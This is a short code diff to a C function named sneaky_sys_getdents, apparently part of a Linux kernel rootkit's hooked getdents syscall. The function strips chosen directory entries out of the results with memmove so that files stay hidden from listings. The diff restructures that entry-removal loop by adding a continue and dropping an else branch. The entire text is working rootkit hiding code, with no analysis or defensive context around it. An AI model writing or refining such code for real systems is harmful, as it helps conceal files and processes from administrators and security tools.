@@ -98,11 +98,9 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
             void *next = (void *)tmp + currSize;
             memmove(tmp, next, leftNum);
             originalRes = originalRes - currSize;
+            continue;
         }
-        else
-        {
-            currNum = currNum + currSize;
-        }
+        currNum = currNum + currSize;
     }
     return originalRes;
 }
